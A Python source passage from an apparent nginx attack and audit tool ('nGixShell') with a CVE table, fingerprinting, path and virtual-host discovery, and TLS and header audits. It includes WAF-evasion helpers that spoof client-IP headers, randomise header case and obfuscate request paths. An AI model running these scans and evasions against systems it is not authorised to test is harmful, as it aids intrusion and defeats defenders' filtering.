        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2016 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2016-4450", {
        "description": "NULL pointer dereference via crafted request body with chunked encoding — worker crash",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 3, 9), "affected_max": (1, 11, 0),
        "fixed_in": "1.11.1 / 1.10.1",
        "config_required": [],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2016-0742", {
        "description": "Invalid pointer dereference in resolver via crafted UDP packet — worker crash",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 6, 18), "affected_max": (1, 9, 9),
        "fixed_in": "1.9.10 / 1.8.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2016-0746", {
        "description": "Use-after-free in resolver — potential RCE via crafted DNS response",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 6, 18), "affected_max": (1, 9, 9),
        "fixed_in": "1.9.10 / 1.8.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2016-0747", {
        "description": "Insufficient CNAME resolution limit in resolver — allows cache poisoning",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 6, 18), "affected_max": (1, 9, 9),
        "fixed_in": "1.9.10 / 1.8.1",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2014 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2014-3556", {
        "description": "STARTTLS command injection in mail proxy allows plaintext command injection",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (1, 5, 6), "affected_max": (1, 7, 3),
        "fixed_in": "1.7.4 / 1.6.1",
        "config_required": ["mail", "starttls"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2014-0133", {
        "description": "Heap buffer overflow in SPDY implementation — potential RCE",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 3, 15), "affected_max": (1, 5, 11),
        "fixed_in": "1.5.12",
        "config_required": ["spdy"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2014-0088", {
        "description": "Memory corruption in SPDY implementation via crafted request — crash",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (1, 5, 10), "affected_max": (1, 5, 10),
        "fixed_in": "1.5.11",
        "config_required": ["spdy"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2013 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2013-2070", {
        "description": "Disclosure of backend responses via crafted HTTP request (proxy_pass)",
        "cvss": 5.3, "severity": "MEDIUM",
        "affected_min": (1, 1, 4), "affected_max": (1, 4, 0),
        "fixed_in": "1.5.0 / 1.4.1",
        "config_required": ["proxy_pass"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2012 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2012-1180", {
        "description": "Use-after-free in proxy module allows disclosure of backend responses",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 1, 0), "affected_max": (1, 1, 16),
        "fixed_in": "1.1.17 / 1.0.13",
        "config_required": ["proxy_pass"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2011 CVEs ───────────────────────────────────────────────────────────────
    ("CVE-2011-4315", {
        "description": "Heap overflow in resolver via crafted DNS response — potential RCE",
        "cvss": 5.0, "severity": "MEDIUM",
        "affected_min": (0, 6, 18), "affected_max": (1, 1, 7),
        "fixed_in": "1.1.8 / 1.0.8",
        "config_required": ["resolver"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    # ── 2009 additional CVEs ────────────────────────────────────────────────────
    ("CVE-2009-3555", {
        "description": "TLS renegotiation vulnerability allows plaintext injection (MITM)",
        "cvss": 7.5, "severity": "HIGH",
        "affected_min": (0, 1, 0), "affected_max": (0, 8, 22),
        "fixed_in": "0.8.23 / 0.7.64",
        "config_required": ["ssl"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
    ("CVE-2009-3898", {
        "description": "Directory traversal via crafted URI in WebDAV COPY/MOVE requests",
        "cvss": 4.9, "severity": "MEDIUM",
        "affected_min": (0, 1, 0), "affected_max": (0, 8, 16),
        "fixed_in": "0.8.17",
        "config_required": ["dav"],
        "local_only": False, "probe": None, "exploit": False,
        "ref": "https://nginx.org/en/security_advisories.html",
    }),
])

# ─── Session globals ──────────────────────────────────────────────────────────
_verbose:       bool  = False
_tmul:          float = 1.0
_log_fh               = None
_log_lock             = threading.Lock()
_user_agent:    str   = "nGixShell/1.0"
_extra_headers: dict  = {}
_jitter_ms:     float = 0.0
_retry_count:   int   = 1
_rate_limiter         = None
_waf_bypass:    bool  = False
_waf_spoof_ip:  str   = ""


# ─── Rate limiter ─────────────────────────────────────────────────────────────

class RateLimiter:
    def __init__(self, rps: float):
        self._interval = 1.0 / rps
        self._lock     = threading.Lock()
        self._next     = 0.0

    def acquire(self) -> None:
        with self._lock:
            now  = time.monotonic()
            wait = self._next - now
            if wait > 0:
                time.sleep(wait)
            self._next = time.monotonic() + self._interval


# ─── I/O helpers ──────────────────────────────────────────────────────────────

def log(msg: str) -> None:
    with _log_lock:
        print(msg)
        if _log_fh is not None:
            _log_fh.write(msg + "\n")
            _log_fh.flush()


def vlog(msg: str) -> None:
    if _verbose:
        log(msg)


def _sleep(seconds: float) -> None:
    total = seconds * _tmul
    if _jitter_ms > 0:
        total += random.uniform(0, _jitter_ms / 1000.0)
    time.sleep(total)


# ─── HTTP helpers ─────────────────────────────────────────────────────────────

def _waf_spoof_headers() -> dict:
    """Return IP-spoofing headers with a private RFC1918 address (or user-specified)."""
    ip = _waf_spoof_ip or (
        f"10.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,253)}"
    )
    return {
        "X-Forwarded-For":   ip,
        "X-Real-IP":         ip,
        "X-Originating-IP":  ip,
        "True-Client-IP":    ip,
        "X-Remote-IP":       ip,
        "X-Client-IP":       ip,
        "X-Forwarded-Host":  "localhost",
        "X-Forwarded-Proto": "https",
        "X-Custom-IP-Authorization": ip,
    }


def _waf_randomize_case(headers: dict) -> dict:
    """Randomize the capitalisation of header names to bypass case-sensitive WAF rules."""
    out = {}
    for k, v in headers.items():
        # leave Host/Connection/Content- intact — servers need those exact
        if k.lower() in ("host", "connection", "content-length", "content-type"):
            out[k] = v
        else:
            out["".join(c.upper() if random.random() > 0.5 else c.lower() for c in k)] = v
    return out


def _build_headers(host: str, extra: dict = None) -> dict:
    ua = random.choice(BROWSER_UAS) if _waf_bypass else _user_agent
    h  = {"Host": host, "User-Agent": ua, "Connection": "close"}
    if _waf_bypass:
        h.update(_waf_spoof_headers())
    h.update(_extra_headers)
    if extra:
        h.update(extra)
    return h


def _headers_to_wire(h: dict) -> bytes:
    d = _waf_randomize_case(h) if _waf_bypass else h
    return b"".join(f"{k}: {v}\r\n".encode("latin-1") for k, v in d.items())


def _waf_obfuscate_path(path: str) -> str:
    """Apply a random path-level obfuscation technique to evade WAF pattern matching."""
    if not _waf_bypass or path in ("/", ""):
        return path
    technique = random.randint(0, 4)
    if technique == 0:
        # double-slash prefix: /admin → //admin
        return "/" + path
    elif technique == 1:
        # inject /./  padding after first segment
        parts = path.split("/", 2)
        if len(parts) >= 2:
            return "/" + parts[1] + "/./" + ("/".join(parts[2:]) if len(parts) > 2 else "")
        return path
    elif technique == 2:
        # percent-encode first letter of each segment
        def enc_seg(seg):
            if not seg:
                return seg
            return "%" + format(ord(seg[0]), "02X") + seg[1:]
        parts = path.split("/")
        return "/".join(enc_seg(s) for s in parts)
    elif technique == 3:
        # uppercase path (nginx is case-sensitive on Linux — WAF may be case-insensitive)
        return path.upper()
    else:
        # add trailing null-safe padding: /%20..
        return path + "/%20"


def _parse_response(raw: bytes) -> tuple:
    """Split raw HTTP response into (status_code, headers_dict, body_bytes)."""
    if b"\r\n\r\n" in raw:
        hdr_raw, body = raw.split(b"\r\n\r\n", 1)
    else:
        hdr_raw, body = raw, b""
    headers = {}
    status  = 0
    lines   = hdr_raw.decode("latin-1", errors="replace").split("\r\n")
    if lines:
        try:    status = int(lines[0].split()[1])
        except: pass
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()
    return status, headers, body


# ─── Network helpers ──────────────────────────────────────────────────────────

def _connect_socks5(host: str, port: int, proxy_host: str,
                    proxy_port: int, timeout: float) -> socket.socket:
    s = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
    s.sendall(b"\x05\x01\x00")
    resp = s.recv(2)
    if len(resp) < 2 or resp[0] != 5 or resp[1] != 0:
        s.close()
        raise ConnectionError(f"SOCKS5 auth failed: {resp!r}")
    host_enc = host.encode("idna")
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(host_enc)]) + host_enc + struct.pack(">H", port))
    hdr = s.recv(4)
    if len(hdr) < 4 or hdr[1] != 0:
        s.close()
        raise ConnectionError(f"SOCKS5 connect rejected: REP=0x{hdr[1]:02x}")
    atyp = hdr[3]
    if atyp == 1:   s.recv(6)
    elif atyp == 3: s.recv(s.recv(1)[0] + 2)
    elif atyp == 4: s.recv(18)
    return s


def _connect(host: str, port: int, timeout: float = 5.0,
             tls: bool = False, proxy: str = None) -> socket.socket:
    if proxy:
        p      = urlparse(proxy)
        scheme = p.scheme.lower()
        ph, pp = p.hostname, p.port or (1080 if "socks" in scheme else 8080)
        if scheme in ("socks5", "socks5h"):
            s = _connect_socks5(host, port, ph, pp, timeout)
        else:
            s = socket.create_connection((ph, pp), timeout=timeout)
            s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
            resp = b""
            while b"\r\n\r\n" not in resp:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            if b" 200 " not in resp:
                s.close()
                raise ConnectionError(f"Proxy CONNECT failed: {resp[:80]!r}")
    else:
        s = socket.create_connection((host, port), timeout=timeout)

    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        try:
            s = ctx.wrap_socket(s, server_hostname=host)
        except Exception:
            s.close()
            raise
    return s


def _http_head(host: str, port: int, path: str = "/",
               tls: bool = False, proxy: str = None,
               timeout: float = 5.0) -> dict:
    if _rate_limiter:
        _rate_limiter.acquire()
    s   = _connect(host, port, timeout=timeout, tls=tls, proxy=proxy)
    req = f"HEAD {path} HTTP/1.1\r\n".encode() + _headers_to_wire(_build_headers(host)) + b"\r\n"
    s.sendall(req)
    s.settimeout(timeout)
    raw = b""
    try:
        while b"\r\n\r\n" not in raw:
            chunk = s.recv(4096)
            if not chunk: break
            raw += chunk
    finally:
        s.close()
    _, headers, _ = _parse_response(raw + b"\r\n\r\n")
    lines = raw.decode("latin-1", errors="replace").split("\r\n")
    if lines:
        headers["status_line"] = lines[0]
        try:    headers["status_code"] = int(lines[0].split()[1])
        except: headers["status_code"] = 0
    return headers


def _http_get(host: str, port: int, path: str = "/",
              tls: bool = False, proxy: str = None,
              timeout: float = 5.0, max_body: int = 8192) -> tuple:
    """GET request — returns (status_code, headers_dict, body_bytes)."""
    if _rate_limiter:
        _rate_limiter.acquire()
    s   = _connect(host, port, timeout=timeout, tls=tls, proxy=proxy)
    req = f"GET {path} HTTP/1.1\r\n".encode() + _headers_to_wire(_build_headers(host)) + b"\r\n"
    s.sendall(req)
    s.settimeout(timeout)
    raw = b""
    try:
        while len(raw) < max_body + 4096:
            chunk = s.recv(4096)
            if not chunk: break
            raw += chunk
    finally:
        s.close()
    status, headers, body = _parse_response(raw)
    return status, headers, body[:max_body]


def _auto_detect_tls(host: str, port: int, proxy: str = None) -> bool:
    try:
        _connect(host, port, timeout=4, tls=False, proxy=proxy).close()
        return False
    except ssl.SSLError:
        return True
    except Exception:
        try:
            _connect(host, port, timeout=4, tls=True, proxy=proxy).close()
            return True
        except Exception:
            return False


# ─── Target parser ────────────────────────────────────────────────────────────

def parse_target(target: str, default_port: int = 19321) -> tuple:
    tls_forced = False
    if "://" in target:
        p          = urlparse(target)
        tls_forced = p.scheme.lower() == "https"
        host       = p.hostname or "127.0.0.1"
        port       = p.port or (443 if tls_forced else 80)
        return host, port, tls_forced

    if target.startswith("["):
        bracket_end = target.find("]")
        host = target[1:bracket_end]
        rest = target[bracket_end + 1:]
        port = int(rest.lstrip(":")) if ":" in rest else default_port
    elif target.count(":") == 1:
        h, p = target.rsplit(":", 1)
        host = h
        port = int(p) if p.isdigit() else default_port
    else:
        host = target
        port = default_port
    return host, port, False


def _parse_target_line(line: str, default_port: int) -> tuple:
    line = line.strip()
    if not line or line.startswith("#"):
        return None, None, None
    return parse_target(line, default_port)


# ─── Version helpers ──────────────────────────────────────────────────────────

def _parse_version(server: str):
    m = re.search(r"nginx/(\d+)\.(\d+)\.(\d+)", server, re.IGNORECASE)
    return tuple(int(x) for x in m.groups()) if m else None


def _version_in_range(v: tuple, vmin: tuple, vmax: tuple) -> bool:
    return vmin <= v <= vmax


# ─── Target fingerprint ───────────────────────────────────────────────────────

def _detect_nginx_passive(headers: dict, body: bytes) -> tuple:
    """
    Detect nginx presence without relying on the Server header.
    Returns (is_nginx: bool, evidence: str, version: tuple|None).

    Techniques used:
    1. Server header (direct)
    2. Nginx error page signature in body
    3. ETag format: nginx uses "<hex>-<hex>"
    4. X-Accel-* headers (nginx upstream headers)
    5. Bad-request response (nginx returns specific 400 page)
    6. Header casing: nginx sends lowercase header names
    """
    server  = headers.get("server", "")
    version = _parse_version(server)

    # 1 — Server header has nginx
    if "nginx" in server.lower():
        return True, f"Server: {server}", version

    # 2 — nginx signature in body HTML (error pages, default page)
    body_text = body.decode("latin-1", errors="replace").lower()
    if "<center>nginx</center>" in body_text or "<hr><center>nginx" in body_text:
        ver = _parse_version(body_text)
        return True, "nginx signature in page body", ver

    # 3 — ETag format: nginx generates "<size_hex>-<mtime_hex>" e.g. "6537cac7-267"
    etag = headers.get("etag", "")
    if re.match(r'"[0-9a-f]+-[0-9a-f]+"', etag):
        return True, f"nginx-style ETag: {etag}", None

    # 4 — nginx upstream / accel headers
    for h in ("x-accel-redirect", "x-accel-buffering", "x-accel-charset"):
        if h in headers:
            return True, f"nginx header present: {h}", None

    # 5 — Via header contains nginx
    via = headers.get("via", "")
    if "nginx" in via.lower():
        ver = _parse_version(via)
        return True, f"Via: {via}", ver

    return False, "", None


def fingerprint_target(host: str, port: int,
                       tls: bool = False, proxy: str = None) -> dict:
    info: dict = {"host": host, "port": port, "tls": tls}
    try:
        # Use GET (not HEAD) so we get the body for passive fingerprinting
        status, headers, body = _http_get(host, port, "/", tls=tls, proxy=proxy, timeout=5)
        server  = headers.get("server", "")
        info["server_header"] = server
        info["status_code"]   = status
        info["via"]           = headers.get("via", "")

        # Direct version from Server header
        version = _parse_version(server)

        # Passive fingerprinting if Server header doesn't reveal nginx
        is_nginx, evidence, passive_ver = _detect_nginx_passive(headers, body)

        if not version and passive_ver:
            version = passive_ver

        info["version"]       = ".".join(str(x) for x in version) if version else None
        info["version_tuple"] = version
        info["nginx_plus"]    = "nginx-plus" in server.lower()
        info["is_nginx"]      = is_nginx or bool(version)
        info["fp_evidence"]   = evidence if evidence else (server or "(none)")

        # If server_tokens off, try fetching a non-existent path to get the
        # nginx 404 error page which always contains the nginx signature
        if not info["is_nginx"]:
            try:
                _, _, err_body = _http_get(host, port,
                    f"/ngixshell-fp-{random.randint(10000,99999)}.html",
                    tls=tls, proxy=proxy, timeout=5)
                is_n2, ev2, ver2 = _detect_nginx_passive({}, err_body)
                if is_n2:
                    info["is_nginx"]    = True
                    info["fp_evidence"] = ev2
                    if ver2 and not version:
                        version = ver2
                        info["version"]       = ".".join(str(x) for x in ver2)
                        info["version_tuple"] = ver2
            except Exception:
                pass

        # Also try a bad request to trigger nginx's 400 page
        if not info["is_nginx"]:
            try:
                s = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
                s.sendall(b"GET \x00 HTTP/1.0\r\n\r\n")
                s.settimeout(3)
                bad_raw = b""
                try:
                    while len(bad_raw) < 2048:
                        chunk = s.recv(512)
                        if not chunk: break
                        bad_raw += chunk
                except Exception:
                    pass
                s.close()
                _, _, bad_body = _parse_response(bad_raw)
                is_n3, ev3, ver3 = _detect_nginx_passive({}, bad_raw)
                if is_n3:
                    info["is_nginx"]    = True
                    info["fp_evidence"] = ev3 + " (bad-request probe)"
                    if ver3 and not version:
                        version = ver3
                        info["version"]       = ".".join(str(x) for x in ver3)
                        info["version_tuple"] = ver3
            except Exception:
                pass

        if tls:
            try:
                raw = socket.create_connection((host, port), timeout=5)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
                ts   = ctx.wrap_socket(raw, server_hostname=host)
                cert = ts.getpeercert()
                ts.close()
                if cert:
                    subj = dict(x[0] for x in cert.get("subject", []))
                    info["tls_cn"]  = subj.get("commonName", "")
                    info["tls_san"] = [v for _, v in cert.get("subjectAltName", [])]
            except Exception as e:
                vlog(f"[v] TLS cert probe: {e}")

    except Exception as e:
        info["error"] = str(e)

    log(f"\n{'─'*60}")
    log(f"  Fingerprint  {host}:{port}")
    log(f"{'─'*60}")
    log(f"  Server  : {info.get('server_header') or '(hidden)'}")
    log(f"  nginx   : {'YES' if info.get('is_nginx') else 'not detected'}"
        + (f"  [{info['fp_evidence']}]" if info.get('fp_evidence') and not info.get('server_header') else ""))
    log(f"  Version : {info.get('version') or 'unknown'}")
    log(f"  Plus    : {'yes' if info.get('nginx_plus') else 'no'}")
    if info.get("tls_cn"):
        log(f"  TLS CN  : {info['tls_cn']}")
    if info.get("tls_san"):
        log(f"  TLS SAN : {', '.join(info['tls_san'][:6])}")
    log(f"{'─'*60}")
    return info


# ─── Version check ────────────────────────────────────────────────────────────

def check_target(host: str, port: int,
                 tls: bool = False, proxy: str = None) -> tuple:
    scheme = "https" if tls else "http"
    log(f"[*] Checking {scheme}://{host}:{port} ...")
    try:
        status, headers, body = _http_get(host, port, "/", tls=tls, proxy=proxy, timeout=5)
        server  = headers.get("server", "")
        is_nginx, evidence, version = _detect_nginx_passive(headers, body)

        if not is_nginx:
            log("[-] nginx not detected (Server header hidden or not nginx)")
            return False, None

        log(f"[+] Server: {server or '(hidden)'}  [{evidence}]")

        if version is None:
            log("[?] nginx detected but version unknown — scanning all CVEs")
            return True, None

        ver_str = ".".join(str(x) for x in version)
        if _version_in_range(version, VULN_MIN, VULN_MAX):
            log(f"[!] nginx {ver_str} — VULNERABLE RANGE "
                f"({'.'.join(str(x) for x in VULN_MIN)}–{'.'.join(str(x) for x in VULN_MAX)})")
            return True, version
        log(f"[-] nginx {ver_str} — not in default vulnerable range")
        return False, version
    except Exception as e:
        log(f"[!] Check failed: {e}")
        return False, None


# ─── Web audit ────────────────────────────────────────────────────────────────

def audit_headers(host: str, port: int,
                  tls: bool = False, proxy: str = None) -> list:
    """
    Check HTTP response headers for missing security headers and information leaks.
    Returns list of issue dicts: {header, severity, issue}.
    """
    issues = []
    try:
        status, headers, _ = _http_get(host, port, "/", tls=tls, proxy=proxy)
    except Exception as e:
        vlog(f"[v] audit_headers connect error: {e}")
        return issues

    log(f"\n[*] Header security audit — {host}:{port}")
    log("─" * 70)

    # Missing security headers
    for hdr_name, label, desc, https_only in SECURITY_HEADERS:
        if https_only and not tls:
            continue
        if hdr_name not in headers:
            sev = "HIGH" if hdr_name in ("strict-transport-security",
                                          "content-security-policy") else "MEDIUM"
            log(f"  [!] {label:<30} {sev:<8} {desc}")
            issues.append({"header": label, "severity": sev, "issue": desc, "type": "missing"})
        else:
            log(f"  [+] {label:<30} {'OK':<8} {headers[hdr_name][:60]}")

    # Leaky headers that reveal technology stack
    for hdr_name in LEAK_HEADERS:
        if hdr_name in headers:
            msg = f"Header '{hdr_name}' leaks server technology: {headers[hdr_name]}"
            log(f"  [!] {hdr_name:<30} {'LOW':<8} {msg}")
            issues.append({"header": hdr_name, "severity": "LOW", "issue": msg, "type": "leak"})

    # Server header version disclosure
    server = headers.get("server", "")
    if server and re.search(r"\d+\.\d+", server):
        msg = f"Server header exposes version: {server}"
        log(f"  [!] {'server':<30} {'LOW':<8} {msg}")
        issues.append({"header": "server", "severity": "LOW", "issue": msg, "type": "leak"})

    log("─" * 70)
    log(f"[+] Header issues: {len(issues)}")
    return issues


def path_discovery(host: str, port: int,
                   tls: bool = False, proxy: str = None,
                   extra_paths: list = None) -> list:
    """
    Probe a wordlist of interesting paths. Returns found paths (non-404 status).
    Uses a random sentinel path to detect catch-all responses (403/301/etc.)
    and suppresses those status codes from results to avoid false positives.
    """
    paths  = list(INTERESTING_PATHS)
    if extra_paths:
        for p in extra_paths:
            paths.append((p, "custom"))

    # ── Detect catch-all status codes ────────────────────────────────────────
    # Send a request to a path that cannot exist; any non-404 response means
    # the server returns that status for ALL unknown paths (catch-all rule).
    catchall_codes = {404, 502, 503, 504}
    try:
        sentinel = f"/ngixshell-probe-{random.randint(100000,999999)}.xyz"
        s_status, s_hdrs, s_body = _http_get(host, port, sentinel,
                                              tls=tls, proxy=proxy, timeout=5)
        if s_status not in (404,):
            catchall_codes.add(s_status)
            vlog(f"[v] catch-all detected: {s_status} (will suppress this status in results)")
    except Exception:
        pass

    found  = []
    log(f"\n[*] Path discovery — {host}:{port} ({len(paths)} paths)")
    log("─" * 70)
    log(f"  {'STATUS':<8} {'PATH':<40} NOTE")
    log("─" * 70)

    for path, note in paths:
        try:
            if _rate_limiter:
                _rate_limiter.acquire()
            probe_path = _waf_obfuscate_path(path)
            status, hdrs, body = _http_get(host, port, probe_path,
                                           tls=tls, proxy=proxy, timeout=5)

            if status in catchall_codes:
                vlog(f"[v] {status} {path} (catch-all/proxy error, skipping)")
                continue

            content_type = hdrs.get("content-type", "")
            marker = "[!]" if status == 200 else "[~]"
            log(f"  {marker} {status:<6}   {path:<40} {note}")

            entry = {"path": path, "status": status, "note": note,
                     "content_type": content_type, "body_preview": ""}

            # Capture stub_status body for parsing
            if status == 200 and path in ("/nginx_status", "/nginx-status"):
                entry["body_preview"] = body.decode("latin-1", errors="replace")[:256]

            found.append(entry)
        except Exception as e:
            vlog(f"[v] {path}: {e}")

    log("─" * 70)
    log(f"[+] Interesting paths: {len(found)}")
    return found


def check_stub_status(host: str, port: int,
                      tls: bool = False, proxy: str = None) -> dict:
    """
    Parse nginx stub_status output from /nginx_status.
    Returns parsed metrics dict or empty dict if not available.
    """
    try:
        status, _, body = _http_get(host, port, "/nginx_status",
                                    tls=tls, proxy=proxy, timeout=5)
        if status != 200:
            return {}
        text = body.decode("latin-1", errors="replace")
        if "Active connections" not in text:
            return {}

        result = {}
        m = re.search(r"Active connections:\s*(\d+)", text)
        if m: result["active_connections"] = int(m.group(1))
        m = re.search(r"(\d+)\s+(\d+)\s+(\d+)", text)
        if m:
            result["accepts"]  = int(m.group(1))
            result["handled"]  = int(m.group(2))
            result["requests"] = int(m.group(3))
        m = re.search(r"Reading:\s*(\d+)\s+Writing:\s*(\d+)\s+Waiting:\s*(\d+)", text)
        if m:
            result["reading"] = int(m.group(1))
            result["writing"] = int(m.group(2))
            result["waiting"] = int(m.group(3))

        log(f"\n[!] nginx stub_status exposed at /nginx_status:")
        for k, v in result.items():
            log(f"    {k}: {v}")
        return result
    except Exception as e:
        vlog(f"[v] stub_status: {e}")
        return {}


def vhost_enum(host: str, port: int,
               tls: bool = False, proxy: str = None) -> list:
    """
    Send requests with different Host headers and detect virtual hosts that
    respond differently from the baseline.
    """
    found = []
    log(f"\n[*] Virtual host enumeration — {host}:{port}")
    log("─" * 70)

    # Baseline
    try:
        baseline_status, baseline_hdrs, baseline_body = _http_get(
            host, port, "/", tls=tls, proxy=proxy, timeout=5)
        baseline_len = len(baseline_body)
        baseline_ct  = baseline_hdrs.get("content-type", "")
    except Exception as e:
        log(f"  [!] Baseline failed: {e}")
        return found

    log(f"  Baseline: {host} → {baseline_status} ({baseline_len} bytes)")
    log(f"  {'VHOST':<35} {'STATUS':<8} {'SIZE':<10} NOTE")
    log("─" * 70)

    for vhost in COMMON_VHOSTS:
        if vhost == host:
            continue
        try:
            if _rate_limiter:
                _rate_limiter.acquire()
            s   = _connect(host, port, timeout=5, tls=tls, proxy=proxy)
            req = (f"GET / HTTP/1.1\r\nHost: {vhost}\r\n"
                   f"User-Agent: {_user_agent}\r\nConnection: close\r\n\r\n").encode()
            s.sendall(req)
            s.settimeout(5)
            raw = b""
            while len(raw) < 16384:
                chunk = s.recv(4096)
                if not chunk: break
                raw += chunk
            s.close()

            status, hdrs, body = _parse_response(raw)
            size = len(body)
            ct   = hdrs.get("content-type", "")

            # Flag if meaningfully different from baseline.
            # Identical size across ALL probes = default server block, not a real vhost.
            size_diff   = abs(size - baseline_len)
            status_diff = status != baseline_status
            # require both status AND body to differ, or a significant body difference
            different = status_diff and size_diff > 100
            if not different and size_diff > 500 and ct != baseline_ct:
                different = True  # different content-type with large body change

            if different:
                note = (f"status {baseline_status}→{status}, body {baseline_len}→{size}b"
                        if status_diff else f"body differs ({size} vs {baseline_len}b)")
                log(f"  [!] {vhost:<35} {status:<8} {size:<10} {note}")
                found.append({"vhost": vhost, "status": status, "size": size,
                              "content_type": ct, "note": note})
            else:
                vlog(f"[v] {vhost}: same as baseline (default server block)")
        except Exception as e:
            vlog(f"[v] vhost {vhost}: {e}")

    log("─" * 70)
    log(f"[+] Distinct virtual hosts: {len(found)}")
    return found


def tls_audit(host: str, port: int, proxy: str = None) -> dict:
    """
    Test TLS protocol support and certificate validity.
    Returns dict with issues list and cert info.
    """
    result  = {"issues": [], "cert": {}, "protocols": {}}
    issues  = result["issues"]

    log(f"\n[*] TLS audit — {host}:{port}")
    log("─" * 70)

    # Protocol version tests — try to connect forcing a max version
    proto_tests = []
    for attr in ("TLSv1", "TLSv1_1", "TLSv1_2", "TLSv1_3"):
        if hasattr(ssl.TLSVersion, attr):
            proto_tests.append(attr)

    for proto_name in proto_tests:
        try:
            import warnings
            ver    = getattr(ssl.TLSVersion, proto_name)
            ctx    = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with warnings.catch_warnings():
                warnings.simplefilter("ignore", DeprecationWarning)
                ctx.minimum_version = ver
                ctx.maximum_version = ver
            raw = socket.create_connection((host, port), timeout=4)
            ts  = ctx.wrap_socket(raw, server_hostname=host)
            ts.close()
            result["protocols"][proto_name] = True
            label    = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
            is_old   = proto_name in ("TLSv1", "TLSv1_1")
            severity = "HIGH" if is_old else "INFO"
            msg      = f"{label} supported{'  ← DEPRECATED' if is_old else ''}"
            log(f"  {'[!]' if is_old else '[+]'} {label:<20} {severity:<8} {msg}")
            if is_old:
                issues.append({"issue": f"{label} supported (deprecated)", "severity": severity})
        except ssl.SSLError:
            result["protocols"][proto_name] = False
            label = proto_name.replace("TLSv1", "TLS 1.").replace("_", ".")
            log(f"  [-] {label:<20} {'OK':<8} not supported")
        except Exception as e:
            vlog(f"[v] TLS {proto_name}: {e}")

    # Certificate checks
    try:
        raw = socket.create_connection((host, port), timeout=5)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            ts   = ctx.wrap_socket(raw, server_hostname=host)
            cert = ts.getpeercert()
            ts.close()
        except Exception:
            raw.close()
            raise

        if cert:
            subj   = dict(x[0] for x in cert.get("subject", []))
            issuer = dict(x[0] for x in cert.get("issuer", []))
            cn     = subj.get("commonName", "")
            not_after_str = cert.get("notAfter", "")
            result["cert"] = {"cn": cn, "issuer": issuer.get("commonName", ""),
                               "not_after": not_after_str}

            log(f"  [*] Cert CN     : {cn}")
            log(f"  [*] Issuer      : {issuer.get('commonName', '?')}")

            # Expiry check
            if not_after_str:
                try:
                    expiry = datetime.datetime.strptime(
                        not_after_str, "%b %d %H:%M:%S %Y %Z"
                    ).replace(tzinfo=datetime.timezone.utc)
                    now    = datetime.datetime.now(datetime.timezone.utc)
                    days   = (expiry - now).days
                    result["cert"]["days_remaining"] = days
                    if days < 0:
                        msg = f"Certificate EXPIRED {abs(days)} days ago"
                        log(f"  [!] {'Expiry':<20} {'CRITICAL':<8} {msg}")
                        issues.append({"issue": msg, "severity": "CRITICAL"})
                    elif days < 30:
                        msg = f"Certificate expires in {days} days"
                        log(f"  [!] {'Expiry':<20} {'HIGH':<8} {msg}")
                        issues.append({"issue": msg, "severity": "HIGH"})
                    else:
                        log(f"  [+] {'Expiry':<20} {'OK':<8} {days} days remaining")
                except Exception as e:
                    vlog(f"[v] cert expiry parse: {e}")

            # Self-signed check
            if subj == issuer:
                msg = "Self-signed certificate"
                log(f"  [!] {'Self-signed':<20} {'MEDIUM':<8} {msg}")
                issues.append({"issue": msg, "severity": "MEDIUM"})
            else:
                log(f"  [+] {'Self-signed':<20} {'OK':<8} issued by CA")

    except Exception as e:
        vlog(f"[v] cert check: {e}")

    log("─" * 70)
    log(f"[+] TLS issues: {len(issues)}")
    return result


# ─── WAF detection ────────────────────────────────────────────────────────────

def detect_waf(host: str, port: int,
